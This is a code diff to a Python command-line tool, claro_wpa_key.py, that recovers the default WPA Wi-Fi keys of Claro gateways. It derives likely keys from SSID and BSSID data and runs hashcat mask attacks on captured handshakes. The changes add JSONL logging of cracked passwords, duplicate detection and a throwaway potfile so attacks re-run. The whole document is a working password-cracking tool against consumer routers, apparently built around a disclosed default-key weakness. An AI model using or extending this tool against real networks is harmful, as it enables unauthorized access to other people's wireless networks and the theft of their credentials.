@@ -42,6 +42,7 @@ Usage (cross-platform - Windows / macOS / Linux, no GUI):
 import os
 import re
 import sys
+import json
 import shlex
 import shutil
 import argparse
@@ -50,8 +51,10 @@ import subprocess
 # ---- config -----------------------------------------------------------------
 HASH_MODE   = 22000     # 22000 = modern WPA/WPA2 (hcxpcapngtool)
 HASHCAT_EXE = None      # None = auto-detect (PATH + common install dirs); or set a full path
-CRACK_FILE  = "claro_cracked.txt"   # confirmed cracks appended here (cwd); git-ignored
+CRACK_FILE  = "claro_cracked.jsonl" # recovered keys appended here (cwd) as JSONL; git-ignored
 SAVE_CRACKS = True      # set False, or pass --no-save, to disable the results log
+FRESH_POTFILE = None    # set by --fresh: a throwaway potfile path so hashcat re-runs
+                        # instead of replaying its cache; the real potfile is untouched
 # -----------------------------------------------------------------------------
 
 def _load_ouis():
@@ -221,9 +224,36 @@ def copy_to_clipboard(text):
         return False
 
 
+def _potfile_args():
+    """`--potfile-path <tmp>` when --fresh is on (else nothing). Routing both the
+    attack and --show through one throwaway potfile makes the run start from an empty
+    cache -> the attack actually executes -> --show still reads back the crack, all
+    without touching the user's real hashcat.potfile."""
+    return ["--potfile-path", FRESH_POTFILE] if FRESH_POTFILE else []
+
+
+def _make_fresh_potfile():
+    """Reserve a unique throwaway potfile path for a --fresh session."""
+    import tempfile
+    fd, p = tempfile.mkstemp(prefix="claro_fresh_", suffix=".potfile")
+    os.close(fd)
+    return p
+
+
+def _drop_fresh_potfile():
+    """Delete the throwaway potfile (best effort) and forget it."""
+    global FRESH_POTFILE
+    if FRESH_POTFILE and os.path.exists(FRESH_POTFILE):
+        try:
+            os.remove(FRESH_POTFILE)
+        except OSError:
+            pass
+    FRESH_POTFILE = None
+
+
 def hashcat_show(exe, path):
     try:
-        r = subprocess.run([exe, "-m", str(HASH_MODE), path, "--show"],
+        r = subprocess.run([exe, "-m", str(HASH_MODE), path, "--show", *_potfile_args()],
                            capture_output=True, text=True, cwd=os.path.dirname(exe))
         return (r.stdout or "").strip()
     except Exception:
@@ -231,7 +261,7 @@ def hashcat_show(exe, path):
 
 
 def _run_hashcat(exe, path, mask):
-    subprocess.run([exe, "-m", str(HASH_MODE), "-a", "3", path, mask],
+    subprocess.run([exe, "-m", str(HASH_MODE), "-a", "3", path, mask, *_potfile_args()],
                    cwd=os.path.dirname(exe))
     return hashcat_show(exe, path)
 
@@ -246,29 +276,106 @@ def kv(label, value):
     print(f"  {C.dim}{label:<11}{C.reset} {value}")
 
 
-def save_crack(net, password, method, capture):
-    """Append a recovered key (beacon-derived or hashcat-confirmed) to CRACK_FILE
-    in the cwd. Returns the path, or None if saving is off / failed. This file is
-    real credential material and is git-ignored -- never commit it."""
-    if not SAVE_CRACKS:
-        return None
+def band_token(essid):
+    """Compact band/role token for the crack log: 5G / 2.4G / mesh-BH / IoT / no-band."""
+    e = (essid or "").upper()
+    if "-5G-BH" in e:
+        return "mesh-BH"
+    if "-IOT" in e:
+        return "IoT"
+    if re.match(r"^CLARO_(?:2\.4G|2G)", e):
+        return "2.4G"
+    if re.match(r"^CLARO_5G", e):
+        return "5G"
+    return "no-band"
+
+
+def crack_record(net, password, *, cls, source, confirmed, attempts, keyspace, capture):
+    """Build one self-describing crack record. `class`/`source`/`confirmed`/`attempts`
+    are orthogonal: what kind of gateway, where the key came from, whether hashcat
+    verified it, and how many candidate keys were tried to land it. `attempts` is
+    always >= 1 (you test even a fully-determined key once): single-OUI and full8 = 1,
+    split-OUI = the byte's rank in the 256 brute. `compal_case` is only meaningful for
+    a single-OUI beacon derivation, so it is null for full8 / split-OUI."""
     import datetime
+    bssid = net["bssid"]
+    tail6, _ = parse_claro_ssid(net["essid"])
+    oui = oui_of(bssid)
+    compal = None
+    if cls == "single-OUI" and tail6:
+        compal = bssid[6:].upper() != tail6.upper()
+    return {
+        "ts": datetime.datetime.now().isoformat(timespec="seconds"),
+        "ssid": net["essid"],
+        "bssid": mac_pretty(bssid),
+        "password": password,
+        "class": cls,                                   # full8 | single-OUI | split-OUI
+        "vendor": OUI_VENDORS.get(oui),                 # None if not a known Claro block
+        "oui": mac_pretty(bssid)[:8],
+        "band": band_token(net["essid"]),
+        "source": source,                               # beacon-derived | handshake-brute
+        "confirmed": confirmed,                          # hashcat-verified against a handshake?
+        "attempts": attempts,                            # candidates tried to land it (>=1; split = rank)
+        "keyspace": keyspace,                            # candidate space (1 or 256)
+        "leading_byte": password[:2].upper() if password else None,
+        "compal_case": compal,                           # single-OUI only; null otherwise
+        "capture": os.path.basename(capture),
+    }
+
+
+# fields that make two records the "same event" for dedup (C): the network, the
+# key, and how it was obtained/verified. Timestamp and capture filename are ignored
+# so re-running the same capture doesn't pile up duplicate rows.
+_CRACK_IDENTITY = ("bssid", "password", "source", "confirmed")
+
+
+def _crack_seen(out, record):
+    """True if an identical crack (same identity fields) is already logged."""
+    if not os.path.exists(out):
+        return False
+    want = tuple(record.get(k) for k in _CRACK_IDENTITY)
+    try:
+        with open(out, encoding="utf-8") as fh:
+            for line in fh:
+                line = line.strip()
+                if not line:
+                    continue
+                try:
+                    prev = json.loads(line)
+                except ValueError:
+                    continue
+                if tuple(prev.get(k) for k in _CRACK_IDENTITY) == want:
+                    return True
+    except OSError:
+        pass
+    return False
+
+
+def save_crack(record):
+    """Append a crack record to CRACK_FILE (cwd) as one JSON line, skipping exact
+    duplicates. Returns (status, path): status is 'saved', 'duplicate', 'disabled'
+    or 'error'. This file is real credential material and is git-ignored -- never
+    commit it."""
+    if not SAVE_CRACKS:
+        return ("disabled", None)
     out = os.path.abspath(CRACK_FILE)
-    new = not os.path.exists(out)
+    if _crack_seen(out, record):
+        return ("duplicate", out)
     try:
         with open(out, "a", encoding="utf-8") as fh:
-            if new:
-                fh.write("# claro_wpa_key.py recovered keys - KEEP PRIVATE (git-ignored)\n")
-                fh.write("# method column: 'derived*' = from beacon (no handshake); "
-                         "'single-OUI'/'split-OUI' = hashcat-confirmed\n")
-                fh.write("# timestamp\tSSID\tBSSID\tpassword\tmethod\tcapture\n")
-            ts = datetime.datetime.now().isoformat(timespec="seconds")
-            fh.write(f"{ts}\t{net['essid']}\t{mac_pretty(net['bssid'])}\t"
-                     f"{password}\t{method}\t{os.path.basename(capture)}\n")
-        return out
+            fh.write(json.dumps(record, ensure_ascii=False) + "\n")
+        return ("saved", out)
     except OSError as exc:
         print(f"    (could not save result: {exc})")
-        return None
+        return ("error", None)
+
+
+def _print_save_status(status, path):
+    """One dim line reporting what save_crack did (saved / already-logged)."""
+    if status == "saved":
+        print(f"    {C.dim}saved to:  {path}{C.reset}")
+    elif status == "duplicate":
+        print(f"    {C.dim}already logged (not re-saved):  {path}{C.reset}")
 
 
 def _save_derived(net, key, full8, oui, capture):
@@ -279,22 +386,60 @@ def _save_derived(net, key, full8, oui, capture):
         print(f"  {C.yellow}Not saved - split-OUI block: the derived key is probably wrong.{C.reset}")
         print(f"  {C.yellow}Run hashcat against a handshake to confirm before trusting it.{C.reset}")
         return
-    method = "derived-full8 (determined)" if full8 else "derived (unconfirmed)"
-    saved = save_crack(net, key, method, capture)
-    if saved:
-        print(f"\n  {C.dim}saved (derived) to:  {saved}{C.reset}")
-
-
-def _cracked(out, headline, net, capture):
+    if full8:
+        rec = crack_record(net, key, cls="full8", source="beacon-derived",
+                           confirmed=False, attempts=1, keyspace=1, capture=capture)
+    else:
+        rec = crack_record(net, key, cls="single-OUI", source="beacon-derived",
+                           confirmed=False, attempts=1, keyspace=1, capture=capture)
+    status, path = save_crack(rec)
     print()
-    print(f"  {C.bold}{C.green}*** CRACKED ***{C.reset} {C.dim}{headline}{C.reset}")
-    saved = None
+    if status == "saved":
+        print(f"  {C.dim}saved (derived, unconfirmed) to:  {path}{C.reset}")
+    else:
+        _print_save_status(status, path)
+
+
+def _cracked(out, net, capture, *, cls):
+    """Report and log a hashcat-confirmed key. `cls` is full8 / single-OUI /
+    split-OUI; source, attempts and keyspace follow from it (single-OUI = 1 guess
+    off the beacon; split-OUI = the byte's rank in the 256 brute)."""
+    tail6, _ = parse_claro_ssid(net["essid"])
+    tail_u = (tail6 or "").upper()
+    oct3 = net["bssid"][4:6].upper()
+    header_done = False
+    status = path = None
     for line in out.splitlines():
-        pw = line.rsplit(":", 1)[-1]
+        pw = line.rsplit(":", 1)[-1].strip()
+        if not pw:
+            continue
+        lead = pw[:2].upper()
+        if cls == "split-OUI":
+            source, keyspace, attempts = "handshake-brute", 256, int(lead, 16) + 1
+            how = (f"leading byte {C.cyan}{lead}{C.reset} recovered by brute "
+                   f"(not in the beacon) + SSID tail {C.yellow}{tail_u}{C.reset}")
+            tag = f"guess {attempts}/256"
+        elif cls == "full8":
+            source, keyspace, attempts = "beacon-derived", 1, 1
+            how = f"SSID embeds the full 8-hex tail {C.yellow}{pw.upper()}{C.reset} - determined"
+            tag = "1 guess (SSID-determined)"
+        else:  # single-OUI
+            source, keyspace, attempts = "beacon-derived", 1, 1
+            how = (f"leading byte {C.cyan}{oct3}{C.reset} = BSSID octet 3 "
+                   f"+ SSID tail {C.yellow}{tail_u}{C.reset}")
+            tag = "1 guess"
+        if not header_done:
+            print()
+            print(f"  {C.bold}{C.green}*** CRACKED ***{C.reset}  "
+                  f"{C.dim}{cls} · {source} · CONFIRMED · {tag}{C.reset}")
+            header_done = True
         print(f"    {C.dim}password:{C.reset}  {C.bold}{C.green}{pw}{C.reset}")
-        saved = save_crack(net, pw, headline, capture) or saved
-    if saved:
-        print(f"    {C.dim}saved to:  {saved}{C.reset}")
+        print(f"    {C.dim}how:{C.reset}       {how}")
+        rec = crack_record(net, pw, cls=cls, source=source, confirmed=True,
+                           attempts=attempts, keyspace=keyspace, capture=capture)
+        st, p = save_crack(rec)
+        status, path = st, (p or path)
+    _print_save_status(status, path)
 
 
 def handle_net(idx, total, path, net, exe, run_mode):
@@ -385,7 +530,7 @@ def handle_net(idx, total, path, net, exe, run_mode):
     print(f"\n  {C.dim}Trying the 1-guess likely key ...{C.reset}\n")
     out = _run_hashcat(exe, path, mask_primary)
     if out:
-        _cracked(out, "single-OUI (leading byte = BSSID octet 3)", net, path)
+        _cracked(out, net, path, cls=("full8" if full8 else "single-OUI"))
         return
     if not mask_fallback:
         print(f"\n  {C.yellow}No match - not on the default key (renamed SSID / changed password).{C.reset}")
@@ -396,7 +541,7 @@ def handle_net(idx, total, path, net, exe, run_mode):
     if not out:
         print(f"\n  {C.yellow}No match - not on the default key (renamed SSID / changed password).{C.reset}")
         return
-    _cracked(out, "split-OUI (leading byte differed from the BSSID)", net, path)
+    _cracked(out, net, path, cls="split-OUI")
 
 
 def capture_mode(path, exe, run_mode, file_no=None, file_total=None):
@@ -460,6 +605,18 @@ MODE_LABEL = {
     "derive": "derive + save likely keys (no handshake)",
 }
 
+# Bare words the interactive prompt accepts as commands (dash optional), mapped to
+# their canonical flag. Lets a user type "run" / "y" / "ask" instead of "-y" etc.
+_WORD_COMMANDS = {
+    "y": "-y", "yes": "-y", "run": "-y",
+    "n": "-n", "no": "-n", "norun": "-n", "print": "-n",
+    "d": "-d", "derive": "-d",
+    "ask": "--ask",
+    "save": "--save", "nosave": "--no-save",
+    "fresh": "--fresh", "stale": "--stale",
+    "h": "-h", "help": "-h",
+}
+
 
 def _print_options(run_mode, exe):
     o = C.yellow  # option tokens
@@ -468,11 +625,13 @@ def _print_options(run_mode, exe):
     print(f"    {o}-n / --no-run{C.reset}   just print the keys + commands (no hashcat)")
     print(f"    {o}-d / --derive{C.reset}   no handshake - derive + save the likely key(s)")
     print(f"    {o}--no-save{C.reset}       don't write recovered keys to {CRACK_FILE}  ({o}--save{C.reset} re-enables)")
+    print(f"    {o}--fresh{C.reset}         ignore hashcat's potfile cache so runs re-attack  ({o}--stale{C.reset} re-enables)")
     print(f"    {C.dim}(default)       show keys, then ask before running hashcat{C.reset}")
     print()
     hc = f"{C.green}found{C.reset}" if exe else f"{C.yellow}not found{C.reset}"
     print(f"  {C.dim}Mode:{C.reset} {C.bold}{MODE_LABEL[run_mode]}{C.reset}   {C.dim}*{C.reset}   "
           f"{C.dim}saving:{C.reset} {'on' if SAVE_CRACKS else 'off'}   {C.dim}*{C.reset}   "
+          f"{C.dim}fresh:{C.reset} {'on' if FRESH_POTFILE else 'off'}   {C.dim}*{C.reset}   "
           f"{C.dim}hashcat:{C.reset} {hc}")
 
 
@@ -547,7 +706,7 @@ def _interactive(exe, run_mode, intro=True):
     """Prompt loop: drop capture file(s) (or paste paths), switch flags inline,
     and keep the window open until a blank line / Ctrl-C. Shared by the
     no-argument launch and the keep-open pause after a drag-and-drop run."""
-    global SAVE_CRACKS
+    global SAVE_CRACKS, FRESH_POTFILE
     if intro:
         print(f"{C.dim}{BAR}{C.reset}")
         print(f"  {C.bold}CLARO Default WPA Key{C.reset}")
@@ -565,24 +724,38 @@ def _interactive(exe, run_mode, intro=True):
         if not line:
             break
         toks = _tokens_from_line(line)
-        flags = [t for t in toks if t.startswith("-")]
-        files = [t for t in toks if not t.startswith("-")]
+        # Accept mode words typed WITHOUT a leading dash (y / run / no / derive / ask
+        # / fresh / ...) as commands, not filenames -- otherwise a bare "y" gets
+        # treated as a path and reports "file not found".
+        flags = [t for t in toks if t.startswith("-") or t.lower() in _WORD_COMMANDS]
+        files = [t for t in toks if not t.startswith("-") and t.lower() not in _WORD_COMMANDS]
         for f in flags:
-            fl = f.lower()
+            fl = _WORD_COMMANDS.get(f.lower(), f.lower())   # normalise bare words to flags
             if fl in ("-y", "--run"):
                 run_mode = "yes"
             elif fl in ("-n", "--no-run"):
                 run_mode = "no"
             elif fl in ("-d", "--derive"):
                 run_mode = "derive"
+            elif fl == "--ask":
+                run_mode = "ask"
             elif fl == "--no-save":
                 SAVE_CRACKS = False
             elif fl == "--save":
                 SAVE_CRACKS = True
+            elif fl == "--fresh":
+                if not FRESH_POTFILE:
+                    FRESH_POTFILE = _make_fresh_potfile()
+                print(f"  {C.dim}fresh: hashcat potfile cache ignored "
+                      f"(runs re-attack; real potfile untouched){C.reset}")
+            elif fl == "--stale":
+                _drop_fresh_potfile()
+                print(f"  {C.dim}fresh off: hashcat may replay its potfile cache{C.reset}")
             elif fl in ("-h", "--help"):
                 _print_options(run_mode, exe)
             else:
-                print(f"  {C.yellow}unknown option '{f}'{C.reset} - try -y, -n, -d, --no-save, or -h")
+                print(f"  {C.yellow}unknown option '{f}'{C.reset} - try -y, -n, -d, "
+                      f"--no-save, --fresh, or -h")
         for i, p in enumerate(files, 1):
             capture_mode(p, exe, run_mode, i, len(files))
         if flags and not files:
@@ -591,7 +764,7 @@ def _interactive(exe, run_mode, intro=True):
 
 
 def main():
-    global SAVE_CRACKS, C
+    global SAVE_CRACKS, C, FRESH_POTFILE
     ap = argparse.ArgumentParser(
         prog="claro_wpa_key.py",
         description="Recover the default Wi-Fi key of affected Claro gateways "
@@ -608,6 +781,10 @@ def main():
                         "(marked unconfirmed); doesn't run hashcat")
     ap.add_argument("--no-save", action="store_true",
                     help=f"don't write anything to {CRACK_FILE}")
+    ap.add_argument("--fresh", action="store_true",
+                    help="ignore hashcat's potfile cache: route the run through a "
+                         "throwaway potfile so the attack actually re-runs (your real "
+                         "potfile is left untouched). For testing/demoing a capture.")
     ap.add_argument("--color", choices=("auto", "always", "never"), default="auto",
                     help="colored output (default: auto - on for a real terminal)")
     ap.add_argument("--no-color", action="store_true", help="alias for --color never")
@@ -616,24 +793,29 @@ def main():
                 else "derive" if args.derive else "ask")
     if args.no_save:
         SAVE_CRACKS = False
+    if args.fresh:
+        FRESH_POTFILE = _make_fresh_potfile()
     C = setup_color("never" if args.no_color else args.color)
 
     exe = find_hashcat()
     paths = [_clean_path(p) for p in args.paths]
 
-    if paths:
-        for i, p in enumerate(paths, 1):
-            capture_mode(p, exe, run_mode, i, len(paths))
-        # A drag-and-drop / double-click launch gets its own console window that
-        # would vanish the instant we return — even (especially) when the capture
-        # had no CLARO_ networks and there's nothing but a "skipped" line to read.
-        # Keep it open, and let more files be dropped in.
-        if _launched_standalone():
-            print()
-            print(f"  {C.dim}Drop more .hc22000 files to check, or press Enter to quit.{C.reset}")
-            _interactive(exe, run_mode, intro=False)
-    else:
-        _interactive(exe, run_mode, intro=True)
+    try:
+        if paths:
+            for i, p in enumerate(paths, 1):
+                capture_mode(p, exe, run_mode, i, len(paths))
+            # A drag-and-drop / double-click launch gets its own console window that
+            # would vanish the instant we return — even (especially) when the capture
+            # had no CLARO_ networks and there's nothing but a "skipped" line to read.
+            # Keep it open, and let more files be dropped in.
+            if _launched_standalone():
+                print()
+                print(f"  {C.dim}Drop more .hc22000 files to check, or press Enter to quit.{C.reset}")
+                _interactive(exe, run_mode, intro=False)
+        else:
+            _interactive(exe, run_mode, intro=True)
+    finally:
+        _drop_fresh_potfile()
 
     if exe is None:
         print_no_hashcat_banner()
